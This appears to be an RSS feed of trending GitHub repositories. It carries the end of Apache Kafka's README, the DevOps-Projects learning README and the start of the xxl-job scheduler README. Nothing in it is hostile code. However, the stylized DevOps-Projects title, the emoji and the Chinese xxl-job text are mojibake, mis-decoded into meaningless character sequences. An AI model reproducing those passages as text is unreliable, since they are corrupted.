&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/trogdor/README.md"&gt;trogdor/README.md&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Running in Vagrant&lt;/h3&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/vagrant/README.md"&gt;vagrant/README.md&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Kafka client examples&lt;/h3&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/apache/kafka/trunk/examples/README.md"&gt;examples/README.md&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Contribution&lt;/h3&gt; 
&lt;p&gt;Apache Kafka is interested in building the community; we would welcome any thoughts or &lt;a href="https://issues.apache.org/jira/browse/KAFKA"&gt;patches&lt;/a&gt;. You can reach us &lt;a href="http://kafka.apache.org/contact.html"&gt;on the Apache mailing lists&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To contribute follow the instructions here:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://kafka.apache.org/contributing.html"&gt;https://kafka.apache.org/contributing.html&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>NotHarshhaa/DevOps-Projects</title>
      <link>https://github.com/NotHarshhaa/DevOps-Projects</link>
      <description>&lt;p&gt;ğ�‘«ğ�’†ğ�’—ğ�‘¶ğ�’‘ğ�’” ğ�‘¹ğ�’†ğ�’‚ğ�’� ğ�‘¾ğ�’�ğ�’“ğ�’�ğ�’… ğ�‘·ğ�’“ğ�’�ğ�’‹ğ�’†ğ�’„ğ�’•ğ�’” ğ�’‡ğ�’�ğ�’“ ğ�‘¨ğ�’”ğ�’‘ğ�’Šğ�’“ğ�’Šğ�’�ğ�’ˆ ğ�‘«ğ�’†ğ�’—ğ�‘¶ğ�’‘ğ�’” ğ�‘¬ğ�’�ğ�’ˆğ�’Šğ�’�ğ�’†ğ�’†ğ�’“ğ�’” [ğ�‘©ğ�’†ğ�’ˆğ�’Šğ�’�ğ�’�ğ�’†ğ�’“ ğ�’•ğ�’� ğ�‘¨ğ�’…ğ�’—ğ�’‚ğ�’�ğ�’„ğ�’†ğ�’…]&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Real-World DevOps/Cloud Projects For Learning from Beginner to Advanced â™�&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/network/members"&gt;&lt;img src="https://img.shields.io/github/forks/NotHarshhaa/DevOps-Projects?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&amp;amp;color=orange" alt="Forks"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/stargazers"&gt;&lt;img src="https://img.shields.io/github/stars/NotHarshhaa/DevOps-Projects.svg?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&amp;amp;color=brightgreen" alt="Stars"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/issues"&gt;&lt;img src="https://img.shields.io/github/issues/NotHarshhaa/DevOps-Projects?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&amp;amp;color=blue" alt="Issues"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/commits/master"&gt;&lt;img src="https://img.shields.io/github/last-commit/NotHarshhaa/DevOps-Projects?style=for-the-badge&amp;amp;logo=git&amp;amp;logoColor=white&amp;amp;color=ff69b4" alt="Last Commit"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/raw/master/CODE_OF_CONDUCT.md"&gt;&lt;img src="https://img.shields.io/badge/Code%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&amp;amp;logo=handshake&amp;amp;logoColor=white" alt="Code of Conduct"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/raw/master/CONTRIBUTING.md"&gt;&lt;img src="https://img.shields.io/badge/Contributions-Welcome-ff69b4?style=for-the-badge&amp;amp;logo=gitbook&amp;amp;logoColor=white" alt="Contributing"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;!-- MARKDOWN LINKS &amp; IMAGES --&gt; 
&lt;p&gt;&lt;img src="https://imgur.com/tlMOmn0.png" alt="DevOps-Projects"&gt;&lt;/p&gt; 
&lt;h2&gt;ğŸ‘¥ &lt;strong&gt;Project Ownership&lt;/strong&gt;&lt;/h2&gt; 
&lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/graphs/contributors"&gt; &lt;img src="https://contrib.rocks/image?repo=NotHarshhaa/DevOps-Projects"&gt; &lt;/a&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸŒŸ &lt;strong&gt;Star History&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://www.star-history.com/#NotHarshhaa/DevOps-Projects&amp;amp;Date"&gt;&lt;img src="https://api.star-history.com/svg?repos=NotHarshhaa/DevOps-Projects&amp;amp;type=Date" alt="Star History Chart"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;p&gt;&lt;em&gt;&lt;em&gt;Welcome to the ultimate resource for &lt;strong&gt;learning DevOps through hands-on projects!&lt;/strong&gt; This repository is designed to cater to aspiring &lt;strong&gt;DevOps engineers&lt;/strong&gt; of all skill levels, from beginners taking their first steps in the field to advanced users looking to deepen their knowledge and expertise.&lt;/em&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%9A%80%20Welcome-Learn%20DevOps%20Through%20Hands--On%20Projects-10b981?style=for-the-badge&amp;amp;logo=opsgenie&amp;amp;logoColor=white" alt="Welcome Badge"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸ§  &lt;strong&gt;Purpose of the Repository&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;This repository serves as a comprehensive resource for aspiring DevOps engineers to learn and implement real-world DevOps projects. It includes guides and solutions for deploying scalable systems, such as deploying a Java application on AWS using a 3-tier architecture and setting up scalable VPC architectures in the cloud.&lt;/p&gt; 
&lt;p&gt;The README files provide detailed instructions for implementing these projects, emphasizing practical deployment steps, pre-requisites, and validation processes. For example, one project focuses on deploying a Java-based login application integrated with a MySQL database, while another covers creating modular VPC network setups leveraging AWS services.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%8E%AF%20Purpose-Comprehensive%20DevOps%20Learning%20Hub-8b5cf6?style=for-the-badge&amp;amp;logo=target&amp;amp;logoColor=white" alt="Purpose of Repository"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸ”� &lt;strong&gt;Analysis of Features and Technologies&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;The repository demonstrates extensive use of DevOps concepts and tools, focusing on AWS cloud infrastructure and automation. It features technologies such as:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;EC2, RDS, VPC, Auto Scaling, IAM roles&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Maven, SonarCloud, JFrog Artifactory&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Monitoring via CloudWatch&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Custom AMIs, automation scripts&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;These elements showcase a robust implementation of scalable, secure, and automated systems aligned with real-world DevOps practices.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%9B%A0%EF%B8%8F%20Features%20&amp;amp;%20Technologies-AWS%2C%20CI%2FCD%2C%20Automation-10b981?style=for-the-badge&amp;amp;logo=amazonaws&amp;amp;logoColor=white" alt="Analysis of Features"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸŒ� &lt;strong&gt;Real-time DevOps/Cloud Projects Showcase&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;To improve readability and accessibility for users, this repository is also available as a modern and responsive web interface.&lt;/p&gt; 
&lt;p&gt;A website showcasing a curated list of major real-time DevOps and Cloud projects, ranging from beginner to advanced levels. Built using &lt;strong&gt;Next.js&lt;/strong&gt; and styled with &lt;strong&gt;Tailwind CSS&lt;/strong&gt;, this project leverages a modern starter template for fast and responsive development. Perfect for learning and exploring hands-on DevOps and Cloud concepts!&lt;/p&gt; 
&lt;p&gt;ğŸ”— &lt;strong&gt;Explore the site&lt;/strong&gt;: &lt;a href="https://projects.prodevopsguytech.com"&gt;projects.prodevopsguytech.com&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%8C%90%20Project%20Showcase-Next.js%20+%20Tailwind%20UI-0ea5e9?style=for-the-badge&amp;amp;logo=vercel&amp;amp;logoColor=white" alt="Showcase Website"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Repository Contents for DevOps Projects from Beginner to Advanced Levels&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT]&lt;/p&gt; 
 &lt;p&gt;&lt;em&gt;This repository contains a comprehensive collection of DevOps projects, each meticulously crafted to provide a hands-on learning experience. The projects are categorized into different skill levels to ensure that everyone, regardless of their current expertise, can find a suitable starting point and progressively enhance their skills.&lt;/em&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Beginner Projects:&lt;/strong&gt; Simple, foundational projects that introduce basic DevOps concepts and tools.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Intermediate Projects:&lt;/strong&gt; More complex projects that require a good understanding of DevOps fundamentals.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Advanced Projects:&lt;/strong&gt; Challenging projects designed to push your limits and deepen your understanding of sophisticated DevOps practices.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%93%82%20DevOps%20Projects-Beginner%20to%20Advanced-blueviolet?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white" alt="DevOps Levels"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Integration of DevOps Technology with Other Technologies&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] &lt;em&gt;In the modern tech landscape, DevOps doesn't exist in isolation. It intersects with a variety of other technologies, enhancing and being enhanced by them. This repository includes projects that integrate DevOps with several key technologies, allowing you to see how these integrations work in real-world scenarios.&lt;/em&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Machine Learning:&lt;/strong&gt; Implement DevOps practices to manage and deploy machine learning models efficiently.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Version Control with Git &amp;amp; GitHub:&lt;/strong&gt; Learn how to manage code versions and collaborate with others using Git and GitHub.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;CI/CD Pipelines:&lt;/strong&gt; Set up continuous integration and continuous deployment pipelines to automate the testing and deployment of your applications.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Cloud Platforms (AWS, Azure, GCP):&lt;/strong&gt; Deploy applications on cloud platforms and leverage their services for scalability and reliability.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Containerization (Docker, Kubernetes):&lt;/strong&gt; Use container technologies to ensure that your applications run consistently across different environments.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%94%97%20DevOps%20+%20Other%20Technologies-Seamless%20Integration-green?style=for-the-badge&amp;amp;logo=git&amp;amp;logoColor=white" alt="Integration"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Project Scope&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] The projects span a wide array of topics within the DevOps domain, each designed to provide practical experience and insights into real-world scenarios. Hereâ€™s a detailed look at the areas covered:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Automated Deployment:&lt;/strong&gt; Learn how to automate the deployment process to ensure that your applications are deployed quickly and reliably.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Continuous Integration &amp;amp; Continuous Deployment (CI/CD):&lt;/strong&gt; Understand how to set up and manage CI/CD pipelines to automate the testing and deployment of your code.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Infrastructure as Code (IaC):&lt;/strong&gt; Use tools like Terraform and CloudFormation to manage your infrastructure through code, ensuring consistency and scalability.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Monitoring &amp;amp; Logging:&lt;/strong&gt; Implement monitoring and logging solutions to keep track of your applicationsâ€™ performance and troubleshoot issues.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Security &amp;amp; Compliance:&lt;/strong&gt; Learn how to incorporate security practices into your DevOps workflows to ensure that your applications are secure and compliant with regulations.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Scalability &amp;amp; Performance Optimization:&lt;/strong&gt; Understand how to scale your applications and optimize their performance to handle increasing loads.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%9B%A0%EF%B8%8F%20Project%20Scope-Hands--on%20DevOps%20Coverage-blue?style=for-the-badge&amp;amp;logo=vercel&amp;amp;logoColor=white" alt="Project Scope"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Why Explore This Repository?&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] This repository is a treasure trove of learning opportunities, tailored to help you grow in the DevOps field. Here's why you should dive in:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Hands-on Experience:&lt;/strong&gt; Each project is designed to provide you with practical, hands-on experience. You'll work through real-world challenges and gain the skills you need to succeed in the industry.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Skill Enhancement:&lt;/strong&gt; Whether you're just starting or looking to build on existing skills, the projects are structured to guide you through a learning path that will enhance your capabilities.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Industry Relevance:&lt;/strong&gt; Stay up-to-date with the latest trends and technologies in DevOps. The projects reflect current industry practices, ensuring that what you learn is relevant and applicable.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Community Engagement:&lt;/strong&gt; Join a community of like-minded learners and professionals. Share your projects, seek feedback, and collaborate on exciting DevOps initiatives.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%93%9A%20Why%20Explore%20This%20Repository%3F-Unlock%20DevOps%20Mastery-brightgreen?style=for-the-badge&amp;amp;logo=bookstack&amp;amp;logoColor=white" alt="Why Explore This Repository"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Code of Conduct&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!CAUTION]&lt;/p&gt; 
 &lt;p&gt;We are committed to fostering a welcoming and respectful environment for all contributors. Please take a moment to review our &lt;a href="https://raw.githubusercontent.com/NotHarshhaa/DevOps-Projects/master/CODE_OF_CONDUCT.md"&gt;Code of Conduct&lt;/a&gt; before participating in this community.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/raw/master/CODE_OF_CONDUCT.md"&gt;&lt;img src="https://img.shields.io/badge/Code%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&amp;amp;logo=handshake&amp;amp;logoColor=white" alt="Code of Conduct"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;&lt;strong&gt;Contribute and Collaborate&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!TIP] This repository thrives on community contributions and collaboration. Hereâ€™s how you can get involved:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Fork the Repository:&lt;/strong&gt; Create your own copy of the repository to work on.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Submit Pull Requests:&lt;/strong&gt; Contribute your projects or improvements to existing projects by submitting pull requests.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Engage with Others:&lt;/strong&gt; Participate in discussions, provide feedback on othersâ€™ projects, and collaborate to create better solutions.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Share Your Knowledge:&lt;/strong&gt; If youâ€™ve developed a new project or learned something valuable, share it with the community. Your contributions can help others in their learning journey.&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;&lt;strong&gt;We follow best practices for contribution.&lt;/strong&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;a href="https://github.com/NotHarshhaa/DevOps-Projects/raw/master/CONTRIBUTING.md"&gt;&lt;img src="https://img.shields.io/badge/Contribute-Guide-ff69b4?style=for-the-badge&amp;amp;logo=gitbook&amp;amp;logoColor=white" alt="Contributing"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸŒ� &lt;strong&gt;Join the Community&lt;/strong&gt;&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] Be a part of our active DevOps community:&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;a href="https://t.me/prodevopsguy"&gt;&lt;img src="https://img.shields.io/badge/Join%20Us%20on-Telegram-26A5E4?style=for-the-badge&amp;amp;logo=telegram&amp;amp;logoColor=white" alt="Join Telegram"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa"&gt;&lt;img src="https://img.shields.io/badge/Follow%20me%20on-GitHub-181717?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white" alt="Follow on GitHub"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;â­� &lt;strong&gt;Hit the Star!&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;If you find this helpful, donâ€™t forget to give this repository a star. Your support matters!&lt;/strong&gt; â­�&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%E2%AD%90%20Support-Give%20a%20Star%20if%20You%20Like%20It-ffd700?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white" alt="Star Badge"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸ› ï¸� &lt;strong&gt;Author &amp;amp; Community&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;This project is crafted by &lt;strong&gt;&lt;a href="https://github.com/NotHarshhaa"&gt;Harshhaa&lt;/a&gt;&lt;/strong&gt; ğŸ’¡&lt;br&gt; Iâ€™d love to hear your feedback! Feel free to share your thoughts.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%9B%A0%EF%B8%8F%20Author%20&amp;amp;%20Community-Crafted%20with%20Passion%20by%20Harshhaa-8a2be2?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white" alt="Author Badge"&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸ“§ &lt;strong&gt;Connect with me:&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://linkedin.com/in/harshhaa-vardhan-reddy"&gt;&lt;img src="https://img.shields.io/badge/LinkedIn-%230077B5.svg?style=for-the-badge&amp;amp;logo=linkedin&amp;amp;logoColor=white" alt="LinkedIn"&gt;&lt;/a&gt; &lt;a href="https://github.com/NotHarshhaa"&gt;&lt;img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white" alt="GitHub"&gt;&lt;/a&gt; &lt;a href="https://t.me/prodevopsguy"&gt;&lt;img src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&amp;amp;logo=telegram&amp;amp;logoColor=white" alt="Telegram"&gt;&lt;/a&gt; &lt;a href="https://dev.to/notharshhaa"&gt;&lt;img src="https://img.shields.io/badge/Dev.to-0A0A0A?style=for-the-badge&amp;amp;logo=dev.to&amp;amp;logoColor=white" alt="Dev.to"&gt;&lt;/a&gt; &lt;a href="https://hashnode.com/@prodevopsguy"&gt;&lt;img src="https://img.shields.io/badge/Hashnode-2962FF?style=for-the-badge&amp;amp;logo=hashnode&amp;amp;logoColor=white" alt="Hashnode"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;ğŸ“¢ &lt;strong&gt;Stay Connected&lt;/strong&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://imgur.com/2j7GSPs.png" alt="Follow Me"&gt;&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/badge/%F0%9F%93%A2%20Stay%20Connected-Join%20our%20DevOps%20Community-orange?style=for-the-badge&amp;amp;logo=telegram&amp;amp;logoColor=white" alt="Stay Connected"&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>xuxueli/xxl-job</title>
      <link>https://github.com/xuxueli/xxl-job</link>
      <description>&lt;p&gt;A distributed task scheduling framework.ï¼ˆåˆ†å¸ƒå¼�ä»»åŠ¡è°ƒåº¦å¹³å�°XXL-JOBï¼‰&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://www.xuxueli.com/doc/static/xxl-job/images/xxl-logo.jpg" width="150"&gt; &lt;/p&gt;
&lt;h3 align="center"&gt;XXL-JOB&lt;/h3&gt; 
&lt;p align="center"&gt; XXL-JOB, a distributed task scheduling framework. &lt;br&gt; &lt;a href="https://www.xuxueli.com/xxl-job/"&gt;&lt;strong&gt;-- Home Page --&lt;/strong&gt;&lt;/a&gt; &lt;br&gt; &lt;br&gt; &lt;a href="https://github.com/xuxueli/xxl-job/actions"&gt; &lt;img src="https://github.com/xuxueli/xxl-job/workflows/Java%20CI/badge.svg?sanitize=true"&gt; &lt;/a&gt; &lt;a href="https://central.sonatype.com/artifact/com.xuxueli/xxl-job-core"&gt; &lt;img src="https://img.shields.io/maven-central/v/com.xuxueli/xxl-job-core"&gt; &lt;/a&gt; &lt;a href="https://github.com/xuxueli/xxl-job/releases"&gt; &lt;img src="https://img.shields.io/github/release/xuxueli/xxl-job.svg?sanitize=true"&gt; &lt;/a&gt; &lt;a href="https://github.com/xuxueli/xxl-job/"&gt; &lt;img src="https://img.shields.io/github/stars/xuxueli/xxl-job"&gt; &lt;/a&gt; &lt;a href="https://hub.docker.com/r/xuxueli/xxl-job-admin/"&gt; &lt;img src="https://img.shields.io/docker/pulls/xuxueli/xxl-job-admin"&gt; &lt;/a&gt; &lt;a href="http://www.gnu.org/licenses/gpl-3.0.html"&gt; &lt;img src="https://img.shields.io/badge/license-GPLv3-blue.svg?sanitize=true"&gt; &lt;/a&gt; &lt;a href="https://www.xuxueli.com/page/donate.html"&gt; &lt;img src="https://img.shields.io/badge/%24-donate-ff69b4.svg?style=flat"&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;&lt;/p&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;XXL-JOB is a distributed task scheduling framework. It's core design goal is to develop quickly and learn simple, lightweight, and easy to expand. Now, it's already open source, and many companies use it in production environments, real "out-of-the-box".&lt;/p&gt; 
&lt;p&gt;XXL-JOBæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼�ä»»åŠ¡è°ƒåº¦å¹³å�°ï¼Œå…¶æ ¸å¿ƒè®¾è®¡ç›®æ ‡æ˜¯å¼€å�‘è¿…é€Ÿã€�å­¦ä¹ ç®€å�•ã€�è½»é‡�çº§ã€�æ˜“æ‰©å±•ã€‚ç�°å·²å¼€æ”¾æº�ä»£ç �å¹¶æ�¥å…¥å¤šå®¶å…¬å�¸çº¿ä¸Šäº§å“�çº¿ï¼Œå¼€ç®±å�³ç”¨ã€‚&lt;/p&gt; 
&lt;h2&gt;Sponsor&lt;/h2&gt; 
&lt;p&gt;XXL-JOB is an open source and free project, with its ongoing development made possible entirely by the support of these awesome backers.&lt;/p&gt; 
&lt;p&gt;XXL-JOB æ˜¯ä¸€ä¸ªå¼€æº�ä¸”å…�è´¹é¡¹ç›®ï¼Œå…¶æ­£åœ¨è¿›è¡Œçš„å¼€å�‘å®Œå…¨å¾—ç›Šäº�æ”¯æŒ�è€…çš„æ”¯æŒ�ã€‚å¼€æº�ä¸�æ˜“ï¼Œ&lt;a href="https://www.xuxueli.com/page/donate.html"&gt;å‰�å¾€èµ�åŠ©é¡¹ç›®å¼€å�‘&lt;/a&gt;&lt;/p&gt; 
&lt;!-- supporter start --&gt; 
&lt;h3 style="color: #E6BE8A;"&gt;é‡‘ç‰Œèµ�åŠ©æ–¹&lt;/h3&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td&gt; &lt;a href="https://www.aliyun.com/product/aliware/mse?utm_content=g_1000401794" title="" target="_blank"&gt; &lt;img width="150px" src="http://www.xuxueli.com/page/static/images/logo_aliyun2.png"&gt; &lt;br&gt; &lt;span style="text-decoration:underline;color: #E6BE8A;"&gt;é˜¿é‡Œäº‘ æ��ä¾›äº‘ä¸Šæ‰˜ç®¡ XXL-JOB&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; 
   &lt;td&gt; &lt;a href="https://www.mall4j.com/cn/?statId=10" title="" target="_blank"&gt; &lt;img width="150px" src="http://www.xuxueli.com/page/static/images/logo_mail4j.png"&gt; &lt;/a&gt; &lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;!-- supporter end --&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.xuxueli.com/xxl-job/"&gt;ä¸­æ–‡æ–‡æ¡£&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.xuxueli.com/xxl-job/en/"&gt;English Documentation&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Communication&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.xuxueli.com/page/community.html"&gt;ç¤¾åŒºäº¤æµ�&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;1ã€�ç®€å�•ï¼šæ”¯æŒ�é€šè¿‡Webé¡µé�¢å¯¹ä»»åŠ¡è¿›è¡ŒCRUDæ“�ä½œï¼Œæ“�ä½œç®€å�•ï¼Œä¸€åˆ†é’Ÿä¸Šæ‰‹ï¼›&lt;/li&gt; 
 &lt;li&gt;2ã€�åŠ¨æ€�ï¼šæ”¯æŒ�åŠ¨æ€�ä¿®æ”¹ä»»åŠ¡çŠ¶æ€�ã€�å�¯åŠ¨/å�œæ­¢ä»»åŠ¡ï¼Œä»¥å�Šç»ˆæ­¢è¿�è¡Œä¸­ä»»åŠ¡ï¼Œå�³æ—¶ç”Ÿæ•ˆï¼›&lt;/li&gt; 
 &lt;li&gt;3ã€�è°ƒåº¦ä¸­å¿ƒHAï¼ˆä¸­å¿ƒå¼�ï¼‰ï¼šè°ƒåº¦é‡‡ç”¨ä¸­å¿ƒå¼�è®¾è®¡ï¼Œâ€œè°ƒåº¦ä¸­å¿ƒâ€�è‡ªç ”è°ƒåº¦ç»„ä»¶å¹¶æ”¯æŒ�é›†ç¾¤éƒ¨ç½²ï¼Œå�¯ä¿�è¯�è°ƒåº¦ä¸­å¿ƒHAï¼›&lt;/li&gt; 
 &lt;li&gt;4ã€�æ‰§è¡Œå™¨HAï¼ˆåˆ†å¸ƒå¼�ï¼‰ï¼šä»»åŠ¡åˆ†å¸ƒå¼�æ‰§è¡Œï¼Œä»»åŠ¡"æ‰§è¡Œå™¨"æ”¯æŒ�é›†ç¾¤éƒ¨ç½²ï¼Œå�¯ä¿�è¯�ä»»åŠ¡æ‰§è¡ŒHAï¼›&lt;/li&gt; 
 &lt;li&gt;5ã€�æ³¨å†Œä¸­å¿ƒ: æ‰§è¡Œå™¨ä¼šå‘¨æœŸæ€§è‡ªåŠ¨æ³¨å†Œä»»åŠ¡, è°ƒåº¦ä¸­å¿ƒå°†ä¼šè‡ªåŠ¨å�‘ç�°æ³¨å†Œçš„ä»»åŠ¡å¹¶è§¦å�‘æ‰§è¡Œã€‚å�Œæ—¶ï¼Œä¹Ÿæ”¯æŒ�æ‰‹åŠ¨å½•å…¥æ‰§è¡Œå™¨åœ°å�€ï¼›&lt;/li&gt; 
 &lt;li&gt;6ã€�å¼¹æ€§æ‰©å®¹ç¼©å®¹ï¼šä¸€æ—¦æœ‰æ–°æ‰§è¡Œå™¨æœºå™¨ä¸Šçº¿æˆ–è€…ä¸‹çº¿ï¼Œä¸‹æ¬¡è°ƒåº¦æ—¶å°†ä¼šé‡�æ–°åˆ†é…�ä»»åŠ¡ï¼›&lt;/li&gt; 
